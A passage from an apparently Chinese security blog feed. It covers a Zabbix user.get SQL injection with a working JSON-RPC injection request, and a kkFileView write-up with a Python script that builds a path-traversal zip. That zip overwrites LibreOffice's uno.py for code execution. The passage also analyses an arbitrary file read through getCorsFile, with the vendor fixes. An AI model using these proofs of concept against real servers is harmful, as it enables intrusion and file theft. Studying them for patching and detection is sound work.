class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addRelatedObjects</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$options</span>, <span class="keyword">array</span> <span class="variable">$result</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$result</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">addRelatedObjects</span>(<span class="variable">$options</span>, <span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$userIds</span> = <span class="title function_ invoke__">zbx_objectValues</span>(<span class="variable">$result</span>, <span class="string">&#x27;userid&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// adding user role</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>] !== <span class="literal">null</span> &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>] !== API_OUTPUT_COUNT) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>] === API_OUTPUT_EXTEND) &#123;</span><br><span class="line">      <span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>] = [<span class="string">&#x27;roleid&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;readonly&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db_roles</span> = <span class="title function_ invoke__">DBselect</span>(</span><br><span class="line">      <span class="string">&#x27;SELECT u.userid&#x27;</span>.(<span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>] ? <span class="string">&#x27;,r.&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,r.&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;selectRole&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>).</span><br><span class="line">      <span class="string">&#x27; FROM users u,role r&#x27;</span>.</span><br><span class="line">      <span class="string">&#x27; WHERE u.roleid=r.roleid&#x27;</span>.</span><br><span class="line">      <span class="string">&#x27; AND &#x27;</span>.<span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;u.userid&#x27;</span>, <span class="variable">$userIds</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$userid</span> =&gt; <span class="variable">$user</span>) &#123;</span><br><span class="line">      <span class="variable">$result</span>[<span class="variable">$userid</span>][<span class="string">&#x27;role&#x27;</span>] = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$db_role</span> = <span class="title function_ invoke__">DBfetch</span>(<span class="variable">$db_roles</span>)) &#123;</span><br><span class="line">      <span class="variable">$userid</span> = <span class="variable">$db_role</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line">      <span class="keyword">unset</span>(<span class="variable">$db_role</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">      <span class="variable">$result</span>[<span class="variable">$userid</span>][<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$db_role</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个方法在<code>adding user role</code>时，将用户可控的options参数内容直接拼接到了SQL语句中，于是造成了SQL注入。并且查询结果会存进<code>$result</code>数组中返回，最终以 json 形式返回到客户端。</p><p><img src="https://s2.loli.net/2024/12/20/Xm3ECKSlDUNWIt9.png" alt="img"></p><p>并且这里注入的位置在查询字段处，可利用度相当高，于是可以轻松构造相关恶意语句</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user.get&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;selectRole&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;roleid, version()&quot;</span><span class="punctuation">,</span> <span class="string">&quot;roleid&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="attr">&quot;userids&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;auth&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2ae264ef7c19d2c2016a302c64e974c6&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/lRNhIozFdMtrxpG.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kkFileView历史漏洞总结</title>
      <link href="/2024/12/20/kkFileView%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2024/12/20/kkFileView%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>首发于奇安信攻防社区 <a href="https://forum.butian.net/article/631">https://forum.butian.net/article/631</a></p></blockquote><p><a href="https://github.com/kekingcn/kkFileView">https://github.com/kekingcn/kkFileView</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>kkFileView为文件文档在线预览解决方案，该项目使用流行的spring boot搭建，易上手和部署，基本支持主流办公文档的在线预览，如doc,docx,xls,xlsx,ppt,pptx,pdf,txt,zip,rar,图片,视频,音频等等</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>以v3.6.0环境搭建为例</p><p>首先从dockerhub下载官方docker镜像</p><p><img src="https://s2.loli.net/2024/12/20/jZiELl9JxN3g7bk.png" alt="img"></p><p>pull下来后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8012:8012 -p 5005:5005 -it --entrypoint /bin/bash  keking/kkfileview:v3.6.0</span><br></pre></td></tr></table></figure><p>然后手动开启远程调试，至于其他参数可以参考官方镜像的entrypoint</p><p><img src="https://s2.loli.net/2024/12/20/vQGySr5zxOehtVA.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/GITw7KHxOcim8yn.png" alt="img"></p><p>然后在github拉取源码</p><p><img src="https://s2.loli.net/2024/12/20/TO1XWZ6A7awpPg9.png" alt="img"></p><p>然后丢进IDEA，在配置中添加JVM远程调试，模块选择kkFileView</p><p><img src="https://s2.loli.net/2024/12/20/CR8qUMl5nicS3Xs.png" alt="img"></p><p>然后正常下断点调试即可</p><h1 id="漏洞分析和利用"><a href="#漏洞分析和利用" class="headerlink" title="漏洞分析和利用"></a>漏洞分析和利用</h1><h2 id="任意文件写入导致RCE"><a href="#任意文件写入导致RCE" class="headerlink" title="任意文件写入导致RCE"></a>任意文件写入导致RCE</h2><blockquote><p>4.2.0 &lt;&#x3D; kkFileviw &lt;&#x3D; 4.4.0beta（最新分支不受影响）</p></blockquote><p>可以任意文件上传，并且可以追加文件内容。</p><p>kkFileView在使用odt转pdf时会调用系统的Libreoffice，而此进程会调用库中的uno.py文件，因此可以覆盖该py文件的内容，从而在处理odt文件时会执行uno.py中的恶意代码。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>这里官方的docker库中没看到符合的版本，这里就用vulhub的docker复现了，p牛yyds</p><p><img src="https://s2.loli.net/2024/12/20/WJBURK7MogsfvzO.png" alt="img"></p><p>根据这个项目可以快速复现</p><p><a href="https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC">https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC</a></p><p>首先制作一个恶意zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        binary1 = <span class="string">b&#x27;ph0ebus&#x27;</span></span><br><span class="line">        binary2 = <span class="string">b&#x27;import os\r\nos.system(\&#x27;touch /tmp/ph0ebus\&#x27;)&#x27;</span></span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;poc.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;poc.zip&quot;</span>)</span><br><span class="line">        zipFile.writestr(<span class="string">&quot;test&quot;</span>, binary1)</span><br><span class="line">        zipFile.writestr(<span class="string">&quot;../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py&quot;</span>, binary2)</span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>上传zip并预览，需要注意的是url的问题，由于这里在本地虚拟机跑的，docker容器访问不到192.168.182.1&#x2F;24的段，于是默认的预览会连接超时，可以重新设置相关环境变量的url，也可以手动改一下参数值</p><p><img src="https://s2.loli.net/2024/12/20/SGBqITL41FQkAdl.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/N5odTpvZGlFK731.png" alt="img"></p><p>进容器查看一下uno.py的文件内容，可以看到文件末尾追加了恶意代码</p><p><img src="https://s2.loli.net/2024/12/20/w5Yl4HsaONWRyFc.png" alt="img"></p><p>然后随便在office创建一个odt文件</p><p><img src="https://s2.loli.net/2024/12/20/WXUe4sAYH2vNFfK.png" alt="img"></p><p>上传并预览</p><p><img src="https://s2.loli.net/2024/12/20/rgHJ3GdMDbsWSep.png" alt="img"></p><p>成功触发格式转换，并执行uno.py的恶意代码，创建了指定文件</p><p><img src="https://s2.loli.net/2024/12/20/CBnyipxASOv9JWb.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/kb1hJs8XfOYoLiw.png" alt="img"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="https://s2.loli.net/2024/12/20/re3GoH7Muw8FVYJ.png" alt="img"></p><p>跟进<code>cn.keking.service.impl.CompressFilePreviewImpl#filePreviewHandle</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">filePreviewHandle</span><span class="params">(String url, Model model, FileAttribute fileAttribute)</span> &#123;</span><br><span class="line">    String fileName=fileAttribute.getName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePassword</span> <span class="operator">=</span> fileAttribute.getFilePassword();</span><br><span class="line">    <span class="type">boolean</span> forceUpdatedCache=fileAttribute.forceUpdatedCache();</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileTree</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 判断文件名是否存在(redis缓存读取)</span></span><br><span class="line">    <span class="keyword">if</span> (forceUpdatedCache || !StringUtils.hasText(fileHandlerService.getConvertedFile(fileName))  || !ConfigConstants.isCacheEnabled()) &#123;</span><br><span class="line">        ReturnResponse&lt;String&gt; response = DownloadUtils.downLoad(fileAttribute, fileName);</span><br><span class="line">        <span class="keyword">if</span> (response.isFailure()) &#123;</span><br><span class="line">            <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, fileAttribute, response.getMsg());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> response.getContent();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fileTree = compressFileReader.unRar(filePath, filePassword,fileName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Throwable[] throwableArray = ExceptionUtils.getThrowables(e);</span><br><span class="line">            <span class="keyword">for</span> (Throwable throwable : throwableArray) &#123;</span><br><span class="line">                <span class="keyword">if</span> (throwable <span class="keyword">instanceof</span> IOException || throwable <span class="keyword">instanceof</span> EncryptedDocumentException) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getMessage().toLowerCase().contains(Rar_PASSWORD_MSG)) &#123;</span><br><span class="line">                        model.addAttribute(<span class="string">&quot;needFilePassword&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                        <span class="keyword">return</span> EXEL_FILE_PREVIEW_PAGE;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ObjectUtils.isEmpty(fileTree)) &#123;</span><br><span class="line">            <span class="comment">//是否保留压缩包源文件</span></span><br><span class="line">            <span class="keyword">if</span> (ConfigConstants.getDeleteSourceFile()) &#123;</span><br><span class="line">                KkFileUtils.deleteFileByPath(filePath);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ConfigConstants.isCacheEnabled()) &#123;</span><br><span class="line">                <span class="comment">// 加入缓存</span></span><br><span class="line">                fileHandlerService.addConvertedFile(fileName, fileTree);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, fileAttribute, <span class="string">&quot;压缩文件密码错误! 压缩文件损坏!  压缩文件类型不受支持!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fileTree = fileHandlerService.getConvertedFile(fileName);</span><br><span class="line">    &#125;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;fileName&quot;</span>, fileName);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;fileTree&quot;</span>, fileTree);</span><br><span class="line">    <span class="keyword">return</span> COMPRESS_FILE_PREVIEW_PAGE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会下载demo文件下的poc.zip，然后在<code>cn.keking.service.CompressFileReader#unRar</code>执行解压操作</p><p><img src="https://s2.loli.net/2024/12/20/jB4EixA8rftUHsm.png" alt="img"></p><p>这里在释放压缩包的文件时将被压缩的文件直接与路径进行拼接并将内容写入到对应路径下，由于未对此进行过滤造成了任意文件写入</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>漏洞在4.4.0-beta最新版被修复</p><p><a href="https://github.com/kekingcn/kkFileView/commit/421a2760d58ccaba4426b5e104938ca06cc49778">https://github.com/kekingcn/kkFileView/commit/421a2760d58ccaba4426b5e104938ca06cc49778</a></p><p>重构了解压逻辑，并加入了路径验证的函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Path <span class="title function_">getFilePathInsideArchive</span><span class="params">(ISimpleInArchiveItem item, Path folderPath)</span> <span class="keyword">throws</span> SevenZipException, UnsupportedEncodingException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">insideFileName</span> <span class="operator">=</span> RarUtils.getUtf8String(item.getPath());</span><br><span class="line">    <span class="keyword">if</span> (RarUtils.isMessyCode(insideFileName)) &#123;</span><br><span class="line">        insideFileName = <span class="keyword">new</span> <span class="title class_">String</span>(item.getPath().getBytes(StandardCharsets.ISO_8859_1), <span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正规化路径并验证是否安全</span></span><br><span class="line">    <span class="type">Path</span> <span class="variable">normalizedPath</span> <span class="operator">=</span> folderPath.resolve(insideFileName).normalize();</span><br><span class="line">    <span class="keyword">if</span> (!normalizedPath.startsWith(folderPath)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Unsafe path detected: &quot;</span> + insideFileName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Files.createDirectories(normalizedPath.getParent());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Failed to create directory: &quot;</span> + normalizedPath.getParent(), e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> normalizedPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限制了释放后的文件只能在当前目录下</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><blockquote><p> kkFileView &lt;&#x3D; v3.6.0，&lt;&#x3D; 4.0.0</p></blockquote><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="https://s2.loli.net/2024/12/20/Gm5q4O2TV1RUjNY.png" alt="img"></p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>查看源码，路由内容如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据url获取文件内容</span></span><br><span class="line"><span class="comment"> * 当pdfjs读取存在跨域问题的文件时将通过此接口读取</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> urlPath  url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> response response</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/getCorsFile&quot;, method = RequestMethod.GET)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getCorsFile</span><span class="params">(String urlPath, HttpServletResponse response)</span> &#123;</span><br><span class="line">    logger.info(<span class="string">&quot;下载跨域pdf文件url：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> WebUtils.normalizedURL(urlPath);</span><br><span class="line">        <span class="type">byte</span>[] bytes = NetUtil.downloadBytes(url.toString());</span><br><span class="line">        IOUtils.write(bytes, response.getOutputStream());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | GalimatiasParseException e) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;下载跨域pdf文件异常，url：&#123;&#125;&quot;</span>, urlPath, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是一个跨域文件读取的接口，但没有对这里的urlPath做限制，由于支持file协议导致了非预期的本地文件读取</p><p>在WebUtils类处理后，传入的file协议字符串解析为<code>galimatias</code> 库的 <code>URL</code>对象，然后通过toJavaURL方法转换为了java原生的URL对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> URL <span class="title function_">normalizedURL</span><span class="params">(String urlStr)</span> <span class="keyword">throws</span> GalimatiasParseException, MalformedURLException &#123;</span><br><span class="line">    <span class="keyword">return</span> io.mola.galimatias.URL.parse(urlStr).toJavaURL();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/uDJVYr7WqPTBmMa.png" alt="img"></p><p>接着通过<code>jodd.io.NetUtil#downloadBytes</code>根据URL对象读取字节流</p><p><img src="https://s2.loli.net/2024/12/20/nRTA9QGidsluBLX.png" alt="img"></p><p>最后通过<code>fr.opensagres.xdocreport.core.io.IOUtils#write</code>方法写入到response中回显</p><h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>v4.1.0版本中修复后的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据url获取文件内容</span></span><br><span class="line"><span class="comment"> * 当pdfjs读取存在跨域问题的文件时将通过此接口读取</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> urlPath  url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> response response</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/getCorsFile&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getCorsFile</span><span class="params">(String urlPath, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (urlPath == <span class="literal">null</span> || urlPath.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        logger.info(<span class="string">&quot;URL异常：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">        response.setStatus(HttpServletResponse.SC_BAD_REQUEST);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;NULL地址不允许预览&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        urlPath = WebUtils.decodeUrl(urlPath);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        logger.error(String.format(BASE64_DECODE_ERROR_MSG, urlPath),ex);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    HttpURLConnection urlcon;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlPath.toLowerCase().startsWith(<span class="string">&quot;file:&quot;</span>) || urlPath.toLowerCase().startsWith(<span class="string">&quot;file%3&quot;</span>)) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;读取跨域文件异常，可能存在非法访问，urlPath：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(<span class="string">&quot;下载跨域pdf文件url：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">    <span class="keyword">if</span> (!urlPath.toLowerCase().startsWith(<span class="string">&quot;ftp:&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> WebUtils.normalizedURL(urlPath);</span><br><span class="line">            urlcon=(HttpURLConnection)url.openConnection();</span><br><span class="line">            urlcon.setConnectTimeout(<span class="number">30000</span>);</span><br><span class="line">            urlcon.setReadTimeout(<span class="number">30000</span>);</span><br><span class="line">            urlcon.setInstanceFollowRedirects(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (urlcon.getResponseCode() == <span class="number">302</span> || urlcon.getResponseCode() == <span class="number">301</span>) &#123;</span><br><span class="line">                urlcon.disconnect();</span><br><span class="line">                url =<span class="keyword">new</span> <span class="title class_">URL</span>(urlcon.getHeaderField(<span class="string">&quot;Location&quot;</span>));</span><br><span class="line">                urlcon=(HttpURLConnection)url.openConnection();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (urlcon.getResponseCode() == <span class="number">404</span> || urlcon.getResponseCode() == <span class="number">403</span> || urlcon.getResponseCode() == <span class="number">500</span> ) &#123;</span><br><span class="line">                logger.error(<span class="string">&quot;读取跨域文件异常，url：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(urlPath.contains( <span class="string">&quot;.svg&quot;</span>)) &#123;</span><br><span class="line">                    response.setContentType(<span class="string">&quot;image/svg+xml&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                inputStream=(url).openStream();</span><br><span class="line">                IOUtils.copy(inputStream, response.getOutputStream());</span><br><span class="line">                urlcon.disconnect();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | GalimatiasParseException e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;读取跨域文件异常，url：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            IOUtils.closeQuietly(inputStream);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> WebUtils.normalizedURL(urlPath);</span><br><span class="line">            <span class="keyword">if</span>(urlPath.contains(<span class="string">&quot;.svg&quot;</span>)) &#123;</span><br><span class="line">                response.setContentType(<span class="string">&quot;image/svg+xml&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            inputStream = (url).openStream();</span><br><span class="line">            IOUtils.copy(inputStream, response.getOutputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | GalimatiasParseException e) &#123;</span><br><span class="line">            logger.error(<span 